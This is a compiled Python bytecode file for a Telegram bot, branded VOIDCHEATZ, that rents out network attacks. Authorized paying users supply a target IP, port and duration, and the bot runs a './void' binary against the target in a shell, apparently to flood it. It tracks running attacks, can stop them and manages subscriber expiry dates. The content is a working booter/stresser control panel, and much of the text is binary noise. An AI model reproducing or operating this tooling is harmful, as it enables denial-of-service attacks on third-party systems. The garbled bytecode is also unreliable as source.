U
    '�g�K  �                	   @   s�  d dl Z d dlmZmZmZmZ d dlZd dlZd dlZd dl	m	Z	m
Z
 d dlZd dlZd dlZd dlZd dlZedd��Ze�� �� ZW 5 Q R X e �e�Zej�ej�e�d�Ze	ddd	�Zd
ZdZdd� Zdd� Z e � Z!dd� Z"dd� Z#e"� �re$ee�� e�%�  dd� Z&dd� Z'dd� Z(dd� Z)dd� Z*dd� Z+i Z,i Z-d d!� Z.ej/d"gd#�d$d%� �Z0ej/d&d'� d(�d)d*� �Z1d+d,� Z2d-d.� Z3d/d0� Z4d1d2� Z5d3d4� Z6ej/d5d'� d(�d6d7� �Z7ej/d8d'� d(�d9d:� �Z8ej/d;d'� d(�d<d=� �Z9ej/d>d'� d(�d?d@� �Z:ej/dAd'� d(�dBdC� �Z;ej/dDd'� d(�dEdF� �Z<ej/dGgd#�dHdI� �Z=dJdK� Z>dLdM� Z?ej/dNgd#�dOdP� �Z@dQdR� ZAej/dSgd#�dTdU� �ZBdVdW� ZCej/dXgd#�dYdZ� �ZDe�E�  dS )[�    N)�ReplyKeyboardMarkup�KeyboardButton�InlineKeyboardMarkup�InlineKeyboardButton)�datetime�	timedeltaz	token.txt�rz	users.txti�  �
   �   Zt4oKs4oCdIFRoaXMgc2NyaXB0IGhhcyBleHBpcmVkIGFuZCBpcyBubyBsb25nZXIgZnVuY3Rpb25hbC4gUGxlYXNlIGNvbnRhY3QgQFZPSURDSEVBVFouzQlkgQFZPSURDSEVBVFo=c                 C   s   t �| ��d�S )z"Decode the base64 encoded message.zutf-8)�base64Z	b64decode�decode)Zencoded_message� r   �v.py�decode_message   s    r   c               	   C   s,   t dd��} dd� | �� D �}W 5 Q R X |S )Nz	Admin.txtr   c                 S   s   g | ]}t |�� ��qS r   )�int�strip)�.0�liner   r   r   �
<listcomp>"   s     z+get_admin_ids_from_file.<locals>.<listcomp>)�open�	readlines)�fileZ	admin_idsr   r   r   �get_admin_ids_from_file    s    r   c                   C   s   t �� tkS �N)r   �now�EXPIRATION_DATEr   r   r   r   �
is_expired'   s    r   c                 C   s   t j| jjtt�dd� d S )N�Markdown�Z
parse_mode)�bot�send_message�chat�idr   �encoded_expired_message��messager   r   r   �notify_expired*   s    r&   c                 C   s   | t kS r   )�	ADMIN_IDS)�user_idr   r   r   �is_admin3   s    r)   c                 C   s   t �d�}t|�| ��S )Nz^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$)�re�compile�bool�match)�ip�patternr   r   r   �is_valid_ip7   s    
r0   c                 C   s   dddddddh}t | �|kS )Ni�!  i N  i�  i\D  iG#  i"N  i!N  )r   )�portZblocked_portsr   r   r   �is_port_blocked<   s    r2   c               	   C   s�   g } i }zpt td��\}|�� }|D ]H}|�� �d�\}}t�|d�}|t�� kr"| �t	|�� ||t	|�< q"W 5 Q R X W n t
k
r�   Y nX | |fS )Nr   �,�%Y-%m-%d %H:%M:%S)r   �USERS_FILE_PATHr   r   �splitr   �strptimer   �appendr   �FileNotFoundError)�authorized_users�expiry_datesr   �linesr   r(   Zexpiry_date_str�expiry_dater   r   r   �load_authorized_users@   s    r>   c              	   C   s6   t td��"}|�| � d|�d�� d�� W 5 Q R X d S )N�ar3   r4   �
)r   r5   �write�strftime)r(   r=   r   r   r   r   �save_authorized_userP   s    rC   c              
   C   s�   zpt td��}|�� }W 5 Q R X t td��<}|D ]0}|�� �d�\}}t|�t| �kr0|�|� q0W 5 Q R X W dS  tk
r� } ztd|� �� W Y �dS d }~X Y nX d S )Nr   �wr3   TzError removing user: F)	r   r5   r   r   r6   r   rA   �	Exception�print)r(   r   r<   r   Zstored_user_id�_�er   r   r   �remove_user_by_idT   s    rI   c                 C   s   t � \}}t| �p| |kS r   )r>   r)   )r(   r:   rG   r   r   r   �is_authorizedf   s    
rJ   �start)Zcommandsc              	   C   s�   t � rt| � d S | jj}t|�s:tj| jjddd� d S tddd�}t	d�}t	d�}t	d�}t	d	�}t	d
�}t	d�}t	d�}	|�
|||||||	� tj| jjd|d� t� }
tddd�}|
�
|� tj| jjdtt�� d�|
d� d S )Nu,   🚫 You are not authorized to use this bot.r   r   T)Zone_time_keyboardZresize_keyboard�   ⚔️ Attack�   🆔 Get ID�   ℹ️ My Info�   🚀 Running Attacks�   📥 Download Canary�   🛠️ Admin Commands�   🛑 FORCE STOPz Welcome! Choose an option below:)Zreply_markupu   🔗 Join Our Channelzhttps://t.me/voidcheatz)Zurlu   💡 This script is made by z. Click below to join: )r   r&   �	from_userr"   rJ   r   r    r!   r   r   �addr   r   r   �encoded_signature_message)r%   r(   ZmarkupZattack_buttonZget_id_buttonZmy_info_buttonZrunning_attacks_buttonZdownload_canary_buttonZadmin_commands_buttonZforce_stop_buttonZinline_markupZjoin_channel_buttonr   r   r   �send_welcomej   s*    
rV   c                 C   s
   | j dkS )NrL   ��textr$   r   r   r   �<lambda>�   �    rY   )�funcc                 C   sF   t � rt| � d S | jj}t|�s:tj| jjddd� d S t| � d S )Nu0   🚫 You are not authorized to use this command.r   r   )	r   r&   rS   r"   rJ   r   r    r!   �
ask_for_ip�r%   r(   r   r   r   �handle_attack_command�   s    r^   c                 C   s$   t j| jjddd� t �| t� d S )Nu!   🌐 Please enter the IP address:r   r   )r   r    r!   r"   �register_next_step_handler�get_ipr$   r   r   r   r\   �   s    r\   c                 C   s`   | j }t|�s&tj| jjddd� d S || jjd�t| jj< tj| jjddd� t�| t	� d S )Nu0   ❌ Invalid IP address. Please enter a valid IP.r   r   )r.   r(   u0   🔌 Got it! Now, please enter the Port number: )
rX   r0   r   r    r!   r"   rS   �	user_datar_   �get_port)r%   r.   r   r   r   r`   �   s    �r`   c                 C   sb   | j }t|�r.tj| jjd|� d�dd� d S |t| jj d< tj| jjddd� t�| t� d S )Nu
   🚫 Port z* is blocked. Please use a different port. r   r   r1   u:   ⏳ Great! Finally, enter the Time duration (in seconds): )	rX   r2   r   r    r!   r"   ra   r_   �get_time)r%   r1   r   r   r   rb   �   s    rb   c                 C   s�   z�t | j�}t| jj d }t| jj d }t| jj d }d|� d|� d|� d�}tjt| jj|||||fd�}|��  t	j
| jjd|� d	tt�� �d
d� W n( tk
r�   t	j
| jjdd
d� Y nX d S )Nr(   r.   r1   z./void � z 20)�target�argsu'   ⚔️ Attack started!

💻 Command: `u/   `
⏳ You will be notified once it's finished. r   r   uC   ❌ Invalid time duration. Please enter a valid number in seconds. )r   rX   ra   r!   r"   �	threading�Thread�execute_attack_asyncrK   r   r    r   rU   �
ValueError)r%   �time_durationr(   r.   r1   �command�threadr   r   r   rc   �   s    
�
rc   c           	      C   s�   z�t j|dt jt jtjd�}|j}||dd|||d�t|< t�|� t| d s�dt| d< t	j
| d	|� d
|� d|� d|� dtt�� �
dd� W n@ t jk
r� } z t	j
| dt|�� d�dd� W 5 d }~X Y nX d S )NT)�shell�stdout�stderrZ
preexec_fn�runningF)�pidrl   �status�force_stoppedr.   r1   �timert   �finishedrs   u'   ✅ Attack finished!

👤 *User ID:* `�   `
🌐 *IP:* `�   `
🔌 *Port:* `�   `
⏳ *Time:* �
 seconds. r   r   u-   ❌ Failed to execute the attack.

*Error:* `�`. )�
subprocess�Popen�PIPE�os�setsidrr   �running_processesru   �sleepr   r    r   rU   ZCalledProcessError�str)	Zchat_idr(   r.   r1   rk   rl   Zprocessrr   rH   r   r   r   ri   �   s    
*�
ri   c                 C   s
   | j dkS )NrO   rW   r$   r   r   r   rY   �   rZ   c                 C   s�   | j j}t|�s(tj| jjddd� d S |tkr�t| d dkr�t| }tj| jjd|� d|d � d	|d
 � d|d � d|d � dtt�� �dd� ntj| jjddd� d S )N�1   🚫 You are not authorized to use this command. r   r   rs   rq   u)   🚀 *Attack Running!*

👤 *User ID:* `rw   r.   rx   r1   ry   ru   u#    seconds
🔹 *Process ID (PID):* `rr   r{   u)   ❌ No running attacks for your account. )	rS   r"   rJ   r   r    r!   r�   r   rU   )r%   r(   �attack_infor   r   r   �running_attacks�   s    D�r�   c                 C   s
   | j dkS )NrR   rW   r$   r   r   r   rY   �   rZ   c                 C   s*  | j j}t|�s(tj| jjddd� d S |tk�rt| d dk�rt| d }zzt�t�	|�t
j� dt| d< dt| d< t| }tj| jjd	|� d
|d � d|d � d|d � dtt�� �
dd� W nD tk
�r } z$tj| jjdt|�� d�dd� W 5 d }~X Y nX ntj| jjddd� d S )Nr�   r   r   rs   rq   rr   rt   Tu)   🛑 *ATTACK STOPPED* 

👤 *User ID:* `rw   r.   rx   r1   ry   ru   rz   u&   ❌ Failed to stop the attack. Error: �. u&   ❌ No running attacks found to stop. )rS   r"   rJ   r   r    r!   r�   r   �killpg�getpgid�signal�SIGTERMr   rU   rE   r�   )r%   r(   rr   r�   rH   r   r   r   �force_stop_attack�   s"    :�
4r�   c                 C   s
   | j dkS )NrM   rW   r$   r   r   r   rY   �   rZ   c                 C   sH   | j j}t|�s(tj| jjddd� d S tj| jjd|� d�dd� d S )Nr�   r   r   u   🆔 *Your Telegram ID is:* `z`.�rS   r"   rJ   r   r    r!   r]   r   r   r   �get_user_id�   s
    r�   c                 C   s
   | j dkS )NrN   rW   r$   r   r   r   rY     rZ   c                 C   s�   | j j}t|�s(tj| jjddd� d S | j jr8| j jnd}t� \}}||kr�d}|| }d|� d|� d|� d	|� d
tt	�� �
}n$d}d|� d|� d|� d
tt	�� �}tj| jj|dd� d S )Nr�   r   r   �N/Au   💎 *Prime Member*u   👤 *User ID:* `u   `
📛 *Username:* @u   
💼 *User Type:* u   
🕒 *Expiry Date:* r�   u   🧑 *Regular Member*)
rS   r"   rJ   r   r    r!   �usernamer>   r   rU   )r%   r(   r�   r:   r;   Z	user_typer=   �infor   r   r   �my_info  s    
( r�   c                 C   s
   | j dkS )NrP   rW   r$   r   r   r   rY     rZ   c                 C   s@   | j j}t|�s(tj| jjddd� d S tj| jjddd� d S )Nr�   r   r   uI   📥 You can download the Canary APK here: https://t.me/CANARYDOWNLOAD/7.r�   r]   r   r   r   �download_canary  s
    r�   c                 C   s
   | j dkS )NrQ   rW   r$   r   r   r   rY   "  rZ   c                 C   s@   | j j}t|�s(tj| jjddd� d S tj| jjddd� d S )Nu3   🚫 You're not authorized to view admin commands. r   r   u|   🛠️ *Admin Commands:*

/add - Add a user
/remove - Remove a user
/send - Send broadcast message
/list - List all users. )rS   r"   r)   r   r    r!   r]   r   r   r   �show_admin_commands"  s    �r�   rT   c                 C   sL   | j j}t|�s(tj| jjddd� d S tj| jjddd� t�| t� d S )N�0   🚫 You're not authorized to use this command. r   r   u(   ✏️ Please enter the User ID to add: )rS   r"   r)   r   r    r!   r_   �get_user_id_to_addr]   r   r   r   �add_user0  s    r�   c                 C   sd   z6t | j�}|td< tj| jjddd� t�| t� W n( t	k
r^   tj| jjddd� Y nX d S )N�user_id_to_addu]   ⏳ Now, please enter the duration (e.g., 2h for 2 hours, 3d for 3 days, or 1m for 1 month): r   r   �'   ❌ Invalid User ID. Please try again. )
r   rX   ra   r   r    r!   r"   r_   �get_duration_to_addrj   r]   r   r   r   r�   :  s    
r�   c              	   C   s"  z�| j �� }td }|�d�rBt|d d� �}t�� t|d� }nz|�d�rpt|d d� �}t�� t|d� }nL|�d�r�t|d d� �}t�� td| d� }ntj	| j
jd	d
d� W d S t||� tj	| j
jd|� d|� dtt�� �d
d� W n* tk
�r   tj	| j
jdd
d� Y nX d S )Nr�   �h�����)�hours�d)�days�m�   uQ   ❌ Invalid duration format. Use 'h' for hours, 'd' for days, or 'm' for months. r   r   �	   ✅ User z" has been added with an expiry of r�   u/   ❌ Invalid duration format. Please try again. )rX   �lowerra   �endswithr   r   r   r   r   r    r!   r"   rC   r   rU   rj   )r%   Zduration_strr(   r�   r=   r�   Zmonthsr   r   r   r�   C  s$    




.r�   �removec                 C   sL   | j j}t|�s(tj| jjddd� d S tj| jjddd� t�| t� d S )Nr�   r   r   u+   ✏️ Please enter the User ID to remove: )rS   r"   r)   r   r    r!   r_   �get_user_id_to_remover]   r   r   r   �remove_userX  s    r�   c                 C   s�   zXt | j�}t|�r:tj| jjd|� dtt�� �dd� ntj| jjd|� d�dd� W n( t	k
r�   tj| jjddd� Y nX d S )Nr�   z has been removed. r   r   u   ❌ Failed to remove user r�   r�   )
r   rX   rI   r   r    r!   r"   r   rU   rj   r]   r   r   r   r�   b  s    
& r�   �sendc                 C   sL   | j j}t|�s(tj| jjddd� d S tj| jjddd� t�| t� d S )Nr�   r   r   u)   📢 Please enter the broadcast message: )rS   r"   r)   r   r    r!   r_   �get_broadcast_messager]   r   r   r   �send_broadcastl  s    r�   c                 C   s�   | j }t� \}}|D ]`}z$tj|d|� dtt�� �dd� W q tk
rr } ztd|� d|� �� W 5 d }~X Y qX qtj| jj	ddd� d S )Nu   📢 Broadcast Message: rd   r   r   zFailed to send message to z	. Error: u)   ✅ Broadcast message sent to all users! )
rX   r>   r   r    r   rU   rE   rF   r!   r"   )r%   Zbroadcast_messager:   rG   r(   rH   r   r   r   r�   v  s    
$(r�   �listc           	      C   s�   | j j}t|�s(tj| jjddd� d S t� \}}|sNtj| jjddd� d S d}|D ]z}zBt�|�}|jrr|jnd}|| }|d|� d|� d	|� d
�7 }W qV t	k
r� } z|d|� d�7 }W 5 d }~X Y qVX qVtj| jj|d dd� d S )Nr�   r   r   u   🔍 No users found. u   📜 User List:

r�   u   🔹 User ID: `u   `
🔹 Username: @u   
🔹 Expiry Date: z

u   🔸 User ID: `z` - Failed to fetch username.

zBY @VOIDCHEATZ)
rS   r"   r)   r   r    r!   r>   Zget_chatr�   rE   )	r%   r(   r:   r;   Z	user_listZ	user_infor�   r=   rH   r   r   r   �
list_users�  s$    

 $r�   )FZtelebotZtelebot.typesr   r   r   r   r   r*   r|   r   r   rg   ru   r�   �sysr   r   r   �readr   Z	API_TOKENZTeleBotr   �path�join�dirname�__file__r5   r   r#   rU   r   r   r'   r   r&   rF   �exitr)   r0   r2   r>   rC   rI   ra   r�   rJ   Zmessage_handlerrV   r^   r\   r`   rb   rc   ri   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   Zpollingr   r   r   r   �<module>   s�   


	






		
	

	

